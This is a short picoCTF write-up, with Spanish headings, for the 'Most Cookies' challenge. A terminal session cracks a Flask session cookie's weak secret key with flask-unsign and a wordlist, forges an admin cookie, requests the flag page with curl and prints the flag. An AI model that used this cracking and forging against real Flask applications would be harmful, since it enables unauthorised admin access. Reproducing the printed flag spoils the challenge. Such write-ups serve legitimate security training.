# Most Cookies

# Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:64503/
# Solución

```  
picoCTF{cO0ki3s_yum_7ff5bad5}
```

```  
┌──(kali㉿kali)-[~/Downloads/picoCTFWeb4/MostCookies]
└─$ nvim cookie.txt             
                                                                           
┌──(kali㉿kali)-[~/Downloads/picoCTFWeb4/MostCookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aazvpg.kipg78xRspl7kHl-26gqQFXA26I" --wordlist cookie.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'icebox'
                                                                               
┌──(kali㉿kali)-[~/Downloads/picoCTFWeb4/MostCookies]
└─$ flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "icebox"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aazxGw.JWidFEqDSrdW919hPMRb_uPeC70
                                                                           
┌──(kali㉿kali)-[~/Downloads/picoCTFWeb4/MostCookies]
└─$ curl http://wily-courier.picoctf.net:64503/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aazxGw.JWidFEqDSrdW919hPMRb_uPeC70"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_7ff5bad5}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>                                                                           
┌──(kali㉿kali)-[~/Downloads/picoCTFWeb4/MostCookies]
└─$ 

```

# Notas adicionales

Con pipx facilita la instalación de programas de python
# Referencias

